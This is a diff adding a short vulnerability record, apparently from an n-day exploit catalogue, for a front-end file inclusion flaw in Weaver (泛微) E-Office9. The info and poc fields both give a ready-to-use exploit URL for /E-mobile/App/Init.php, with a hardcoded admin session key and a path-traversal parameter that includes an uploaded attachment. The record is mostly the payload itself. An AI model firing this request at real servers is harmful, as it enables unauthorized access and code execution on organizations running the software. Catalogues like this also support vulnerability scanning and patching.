@@ -1,0 +1,8 @@
+vendor = "泛微"
+name = "泛微E-Office9 /E-mobile/App/Init.php前台文件包含"
+type = "任意文件上传"
+source = "公众号"
+info = "http://xx.xx.xx/E-mobile/App/Init.php?weiApi=1&sessionkey=ee651bec023d0db0c233fcb562ec7673_admin&m=12344554_../../attachment/xxx.xls"
+date = "08.09"
+poc = "http://xx.xx.xx/E-mobile/App/Init.php?weiApi=1&sessionkey=ee651bec023d0db0c233fcb562ec7673_admin&m=12344554_../../attachment/xxx.xls"
+label = "nday"
